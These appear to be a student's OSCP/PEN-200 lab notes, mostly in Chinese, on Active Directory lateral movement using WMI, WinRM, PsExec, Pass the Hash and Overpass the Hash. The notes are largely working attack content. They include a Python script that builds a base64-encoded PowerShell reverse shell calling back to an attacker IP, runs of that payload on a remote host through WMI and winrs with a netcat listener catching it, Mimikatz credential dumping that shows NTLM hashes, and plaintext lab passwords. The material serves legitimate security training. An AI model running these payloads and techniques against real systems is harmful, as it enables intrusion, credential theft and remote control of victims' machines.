---
title: '[OSCP, PEN-200] Instructional notes - Part 7'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 7
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 6](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md) 內容

# Lateral Movement in Active Directory
前章節收集了密碼 Hash 值，並利用現有 ticket 進行 Kerberos 驗證。
再來將使用 Lateral Movement 技術來攻擊 high-value domain users 的機器。
>[!Tip]
>1. Kerberos 與 NTLM 認證機制並不直接使用明文密碼，因此單純破解可能並不適用。
>2. Microsoft 的 native tools 也不支援利用密碼雜湊直接進行認證

## Active Directory Lateral Movement Techniques
有關 Active Directory Domain 的技巧在 Lateral Movement 階段仍然有用，可能因此獲得先前未被發現的網路的存取權
### WMI and WinRM
WMI（Windows Management Instrumentation） 和 WinRM（Windows Remote Management） 作為 Active Directory Lateral Movement 技術的工具
>[!Note]
>**[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI):**\
>Windows 內建的一種 object-oriented 管理架構，可以用來管理系統資源、查詢資訊，以及遠端執行命令。它透過 RPC（[Remote Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)）進行通訊，使用 TCP 135 連接遠端系統，並使用 高範圍連接埠（19152-65535） 來傳輸資料。\
WMI 允許透過 Win32_Process 類別 來建立新的 process，這使得 attacker 可以利用它來在目標系統上執行任意指令。

#### WMI 橫向移動攻擊
使用 wmic（Windows Management Instrumentation Command-line tool） 來在遠端目標機器上建立新的 process。雖然 wmic 已被微軟棄用，但仍可用於老舊環境。此外，攻擊者也可以改用 PowerShell 來達成相同效果。

將以用戶 jen 的身分執行攻擊，jen 既是 domain user，也是目標電腦的 Local Administrator group member。
#### 1. 使用 wmic 遠端執行 calc.exe
使用 Jeff RDP 登入
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
```
透過 wmic 來在遠端機器 FILES04（192.168.144.73） 上開啟計算機（calc.exe）：
```
PS C:\Users\jeff> wmic /node:192.168.144.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2332;
        ReturnValue = 0;
};
```
>`ProcessId = 2332;`: 表示成功建立了一個新 process\
`ReturnValue = 0;`: 表示命令成功執行

在遠端機器的 工作管理員 中，會看到 `win32calc.exe` 以使用者 jen 身份運行。\
(jen RDP: Task Manager)\
![image](https://hackmd.io/_uploads/SyySXf1hJg.png)


>[!Note]
>System processes and services always run in [session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.
#### 2. 使用 PowerShell 透過 WMI 執行命令
(1) 建立 [PSCredential](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) Object 來儲存我們的 session username 和 password。\
PowerShell 需要將密碼轉換為 SecureString 來存儲
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
(2) 建立 WMI 連線:\
使用 [New-Cimsession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) 來與遠端機器建立 session
```
PS C:\Users\jeff> $options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $session = New-Cimsession -ComputerName 192.168.144.73 -Credential $credential -SessionOption $Options 
PS C:\Users\jeff> $command = 'calc';
```
(3) 執行遠端指令
```
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4876           0 192.168.144.73
```
>`ProcessId = 3712;` 代表成功建立新 process\
`ReturnValue = 0;` 代表指令執行成功
>> 在 FILES04 上會啟動 calc.exe，證明橫向移動成功。

(jen RDP: Task Manager)\
![image](https://hackmd.io/_uploads/ByFO7z13yx.png)

#### 3. WMI Reverse Shell
可以不只開啟 `calc.exe`，還能執行 Reverse Shell，讓遠端目標機器回連攻擊者的 Kali Linux，提供完整的控制權限。
```py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.159",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
```
┌──(chw㉿CHW)-[~/Tools]
└─$ python3 WMI_reverseshell.py 
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABi
```
>產生 payload
##### 3.2 透過 WMI 在遠端機器執行 reverse shell
與上述 calc.exe 一樣的步驟，只是將 command 改成 base64 encode 的 reverse shell
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.144.73 -Credential $credential -SessionOption $Options
PS C:\Users\jeff> $Command='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
PS C:\Users\jeff> $Command='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4708           0 192.168.144.73

PS C:\Users\jeff>

```
(Kali 監聽 8888 port)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

    
connect to [192.168.45.159] from (UNKNOWN) [192.168.144.73] 61659
PS C:\Windows\system32> hostname
FILES04
PS C:\Windows\system32> whoami
corp\jen
```

#### 使用 WinRM 進行橫向移動
除了 WMI 之外，也可以利用 WinRM（Windows Remote Management） 來達成相同的效果。\
WinRM 可用於遠端主機管理。 WinRM 是 [WS-Management](https://en.wikipedia.org/wiki/WS-Management) 協定的 Microsoft 版本 ，透過 HTTP 和 HTTPS 交換 XML 資訊。使用 TCP `5986` port 進行加密 HTTPS 流量，使用 `5985` port 進行純 HTTP 流量。
#### 1. 透過 WinRS 遠端執行命令
WinRS 是 WinRM 的 CLI 工具
```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```
#### 2. 透過 WinRS 執行 Reverse shell
將 command 改成 reverse shell payload
```
PS C:\Users\jeff> winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
#< CLIXML
```
(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.144.73] 61661

PS C:\Users\jen> hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
PS C:\Users\jen> 

```
#### 3. 透過 PowerShell Remoting 建立 WinRM session
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
PS C:\Users\jeff> New-PSSession -ComputerName 192.168.144.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.144.73  RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\jeff> Enter-PSSession 1
[192.168.144.73]: PS C:\Users\jen\Documents> whoami
corp\jen
[192.168.144.73]: PS C:\Users\jen\Documents> hostname
FILES04
```
> 建立一個遠端會話，Session ID 為 1\
`State = Opened`：表示 session 處於開啟狀態，可以直接交互\
`Enter-PSSession 1` 直接進入遠端 PowerShell session，這樣可以直接在 192.168.144.73 上執行命令

### PsExec
PsExec 是 [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite 中的一個強大工具。\
主要用途是提供 Remote Execution，類似於 Telnet，但不需要手動開啟遠端桌面或 SSH 連線。可以 遠端執行命令，並且提供 interactive shell。
透過 ADMIN$ share（Windows 內建的管理共享）來傳輸執行檔案。

>[!Note]
>如何透過 PsExec 進行橫向移動，需要滿足三個條件：
>1. 擁有管理員（Administrator）權限：
連線的帳戶（如 corp\jen）必須是目標機器的 Local Administrator。
>2. ADMIN$ 共享必須開啟：
ADMIN$ share 是一個內建的 Windows 網路管理共享，用於遠端管理 Windows 系統。\
(預設情況下，Windows 伺服器會啟用 ADMIN$，因此通常可用)
>3. 文件與印表機共享（File and Printer Sharing）必須開啟：
這允許 PsExec 透過 SMB 協議與目標機器通訊。\
(預設情況下，Windows 伺服器會啟用這項功能)

當執行 PsExec 遠端執行命令時，會將 `psexesvc.exe`（PsExec 服務程式）寫入遠端目標的 `C:\Windows\` 目錄。在遠端機器上建立並啟動一個 Windows 服務。讓該服務以 `psexesvc.exe` 為 parent process，執行攻擊者提供的命令。

[環境範例]\
假設我們已經成功獲取 FILES04 上 jen 的 明文密碼，並且擁有 CLIENT74 的 RDP 存取權。
此時，我們可以利用 CLIENT74 來使用 PsExec，並遠端連接 FILES04。
#### 1. 登入 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.144.74cd \To    
```
#### 2. 使用 PsExec 遠端執行指令
SysInternals suit 已經安裝在 `C:\Tools\SysinternalsSuite`
```
PS C:\Tools> cd .\SysinternalsSuite\
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```
>`-i`：使用 Interactive Mode\
`\\FILES04`：指定目標機器（遠端 Windows 伺服器）\
`-u corp\jen`：使用者帳戶（是 FILES04 的管理員）\
`-p Nexus123!`：密碼（jen 帳戶的明文密碼）\
`cmd`：執行的程式（這裡是 Windows 命令提示字元）

>[!Important]
>PsExec 比較 WMI & WinRM
>![image](https://hackmd.io/_uploads/ryWbUH1nJl.png)

### Pass the Hash
直接利用 NTLM hash 進行身份驗證並達成 Lateral Movement\
>[!Tip]
>只適用於使用 NTLM 驗證的伺服器或服務，不適用於使用 Kerberos 驗證的伺服器或服務

PtH 屬於 MITRE Framework 中的 "[Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)"

>[!Important]
>**PtH 工具**:
>- Metasploit 的 [PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
>- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
>- [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)（常用於紅隊測試）
>
> 工具的基本原理類似，使用 SMB（TCP 445） 連接目標系統，然後利用 NTLM Hash 來驗證身份

>[!Note]
>Pass the Hash（PtH）需要滿足三個條件:
>1. 目標機器的 SMB（TCP 445）必須開啟（允許網路存取）。
>2. Windows 必須啟用「文件與印表機共享（File and Printer Sharing）」。
>3. 目標機器的 ADMIN$ share 必須開啟（這是 Windows 內建的管理共享，預設開啟）。
>
>與 PsExec 類似，PtH 通常需要 Local Administrator 權限，因為只有管理員帳戶能夠存取 ADMIN$。

[環境範例]\
假設已經竊取了 FILES04 伺服器的本機管理員 NTLM Hash，可以直接使用這個 Hash 來驗證，而不需要破解密碼。
#### 1. 使用 Impacket 的 wmiexec 進行 PtH
在 Kali Linux 上執行 wmiexec 來存取 FILES04
```
┌──(chw㉿CHW)-[~]
└─$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.144.73
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```
> `/usr/bin/impacket-wmiexec`：Impacket 工具中的 wmiexec.py（用於遠端執行命令）\
`-hashes :`：已經獲取的 NTLM Hash\
`Administrator@192.168.144.73`：目標帳戶 Administrator 在 FILES04（IP 192.168.144.73）上執行

[2014 年的 Windows 安全性更新](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a) 限制了 本機管理員帳戶的 PtH 使用，但仍然可以用於 Active Directory domain accounts。

>[!Tip]
>**PtH + Pivoting**\
如果目標機器 FILES04 在受限網路（無法直接存取），可以：\
先滲透 CLIENT74，取得 FILES04 的 NTLM Hash\
在 CLIENT74 上執行 PtH 攻擊 FILES04，透過 Pivoting（樞紐攻擊） 進一步擴展控制權限。

### Overpass the Hash
Overpass the Hash（PtK）是進階的 Pass the Hash（PtH）變種攻擊，可以 將 NTLM hash 轉換成 Kerberos ticket，並利用 Kerberos 驗證來執行遠端命令，達成 Lateral Movement。
- PtH 直接使用 NTLM Hash 驗證 SMB（TCP 445）等 NTLM 服務。
- PtK 將 NTLM Hash 轉換為 Kerberos [Ticket Granting Ticket](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) （TGT），利用 TGT 存取 [Ticket Granting Service](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS)，Kerberos 服務如：
    - CIFS（檔案共享）
    - RDP（遠端桌面）
    - LDAP（用於 Active Directory 存取）
    - PsExec（遠端執行命令）

>[!Note]
> Overpass the Hash 條件：
> 1. 已經取得 NTLM Hash
> 2. 目標使用者（如 `jen`）已經登入某台機器
> 3. 網路上有可用的 Kerberos 服務（如 Active Directory）

#### 1. 取得目標使用者的 NTLM Hash
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.170.76
```
以 `jeff` 在 CLIENT76 上執行 Mimikatz 來提取 jen 的 NTLM Hash
```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session           : Interactive from 0
User Name         : jen
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/27/2023 7:43:20 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1124
        msv :
         [00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075
         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
        tspkg :
        wdigest :
         * Username : jen
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jen
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
...
```
#### 2. 使用 Mimikatz 進行 Overpass the Hash
使用 Mimikatz 的 `sekurlsa::pth` 建立一個新的 PowerShell process，這個 process 將使用 jen 的 NTLM hash 來模擬其身份，並取得 Kerberos ticket：
```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8072
  |  TID  8136
  |  LSA Process is now R/W
  |  LUID 0 ; 2389572 (00000000:00247644)
  \_ msv1_0   - data copy @ 000001B80515E000 : OK !
  \_ kerberos - data copy @ 000001B8051BE228
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001B8051C73E8 (32) -> null
```
會出現新的 PowerShell session\
![image](https://hackmd.io/_uploads/HJiQgxl31g.png)
> 輸入 `whoami` 為什麼還是 `jeff`?!

>[!Important]
>At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended `behavior of the whoami` utility which only `checks the current process's token` and `does not inspect any imported Kerberos tickets`

#### 3. 觸發 Kerberos（TGT）& `klist` 檢查利用 ticket
`klist` 用於檢查目前系統 Cache 的 Kerberos ticket（TGT, TGS)。\
使用 `net use` 存取 FILES04 Server，讓 Windows 向 AD 請求一張 Kerberos ticket，以驗證 jen。
```
PS C:\Windows\system32> klist

Current LogonId is 0:0x264151

Cached Tickets: (0)
PS C:\Windows\system32> net use \\files04
The command completed successfully.

PS C:\Windows\system32> klist

Current LogonId is 0:0x264151

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/13/2025 1:33:47 (local)
        End Time:   3/13/2025 11:33:47 (local)
        Renew Time: 3/20/2025 1:33:47 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 3/13/2025 1:33:47 (local)
        End Time:   3/13/2025 11:33:47 (local)
        Renew Time: 3/20/2025 1:33:47 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```
> `Ticket #0` : TGT（Ticket Granting Ticket）\
